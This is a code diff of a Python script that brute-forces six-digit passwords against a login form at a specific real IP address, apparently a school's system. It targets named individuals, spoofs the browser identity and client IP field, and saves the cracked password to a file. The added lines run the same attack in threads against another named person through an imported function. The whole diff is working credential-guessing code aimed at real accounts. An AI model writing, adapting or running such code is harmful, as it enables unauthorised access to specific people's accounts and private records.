@@ -1,59 +1,18 @@
-from datetime import datetime, timedelta, timezone
+import os
+import time
+from threading import Thread
 
-import requests
-from fake_useragent import UserAgent
+from init import startrun
 
-ua = UserAgent()
-from faker import Faker
+target = '余佩倫'
 
-faker = Faker()
-passwd = 10063
+t1 = Thread(target=startrun, args=(201841,target,True))
+t1.daemon = True
+t1.start()
+t2 = Thread(target=startrun, args=(999999,target,False))
+t2.daemon = True
+t2.start()
+print('run')
 
 while True:
-	header = {'User-Agent':ua.chrome,'Upgrade-Insecure-Requests':'1','Referer':'http://140.126.151.12/csnskj/Permain.asp','Origin':'http://140.126.151.12','Host':'140.126.151.12','Content-Type':'application/x-www-form-urlencoded','Content-Length':'169','Connection':'keep-alive','Cache-Control':'max-age=0','Accept-Language':'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate'}
-	if len(str(passwd)) == 1:
-		spasswd = '00000' + str(passwd)
-	if len(str(passwd)) == 2:
-		spasswd = '0000' + str(passwd)
-	if len(str(passwd)) == 3:
-		spasswd = '000' + str(passwd)
-	if len(str(passwd)) == 4:
-		spasswd = '00' + str(passwd)
-	if len(str(passwd)) == 5:
-		spasswd = '0' + str(passwd)
-	if len(str(passwd)) == 6:
-		spasswd = str(passwd)
-	if passwd > 1000000:
-		print('fuck failed')
-		break
-    
-	r = requests.post('http://140.126.151.12/csnskj/Reg_Per.ASP',data={
-    'SCH_NO':'',
-    'Time':'',
-    'LEVEL':'0',
-    'REMOTE_HOST':str(faker.ipv4()),
-    'txtT_NO':'',
-    'txtName':'金雪玲'.encode('big5'),
-    'txtPass':spasswd
-    },headers=header,allow_redirects=False)
-	r.encoding = 'big5'
-	rheader = r.headers['Set-Cookie']
-	if 'mPass' in rheader:
-    	#we fuck out the real passwd
-		file = open('passwd.txt','a+')
-		file.write(str(spasswd)+'\n')
-		file.close()
-		print('\n passwd is ' +spasswd)
-		break
-	else:
-    	#not yet
-		file = open('failed.txt','a+')
-		file.write(str(spasswd)+'\n')
-		file.close()
-		passwd += 1
-		dt1 = datetime.utcnow().replace(tzinfo=timezone.utc)
-		dt2 = dt1.astimezone(timezone(timedelta(hours=8))) # 轉換時區 -> 東八區
-		twt=dt2.strftime("%Y-%m-%d %H:%M:%S")
-		print("\r Running...."+spasswd+",Taiwan Time:"+twt,end = "")
-
-
+    time.sleep(1)
